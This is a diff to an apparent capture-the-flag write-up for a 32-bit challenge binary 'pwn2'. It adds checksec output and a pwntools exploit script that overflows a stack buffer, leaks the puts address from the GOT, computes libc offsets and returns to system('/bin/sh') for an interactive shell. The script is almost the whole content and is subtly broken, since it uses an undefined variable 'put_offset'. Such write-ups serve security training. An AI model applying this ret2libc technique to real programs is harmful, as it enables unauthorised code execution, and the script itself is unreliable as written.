@@ -3,6 +3,11 @@
 checksec
 
 ```
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
 
 ```
 
@@ -117,6 +122,49 @@ binsh_addr = binsh_offset + libc_addr
 exp:
 
 ```
+from pwn import *
+import sys
+r = process("./pwn2")
+elf = ELF("./pwn2")
+print util.proc.pidof(r)
+puts_plt = elf.plt['puts']
+puts_got = elf.got['puts']
+puts_offset = 0x5f140
+printf_got = elf.got['printf']
+function = 0x8048637
+system_offset = 0x3a940
+name = 'a'*250
+occ = 'b'*250
+pause()
+
+r.recv()
+r.sendline(name)
+r.recv()
+r.sendline(occ)
+r.recv()
+r.sendline('Y')
+payload = 'a'*(0x111+4) + p32(puts_plt) + p32(function) + p32(puts_got)
+r.sendline(payload)
+r.recvuntil("\n\n")
+
+put_addr = u32(r.recv(4))
+
+success(hex(put_addr))
+libc_addr = put_addr - put_offset
+sys_addr = libc_addr + system_offset
+binsh_addr = libc_addr + 0x15902b
+payload = 'a'*(0x111+4) + p32(sys_addr) + p32(function) + p32(binsh_addr)
+r.recv()
+r.sendline(name)
+r.recv()
+r.sendline(occ)
+r.recv()
+r.sendline('Y')
+r.sendline(payload)
+
+r.interactive()
+
+
 
 ```
 
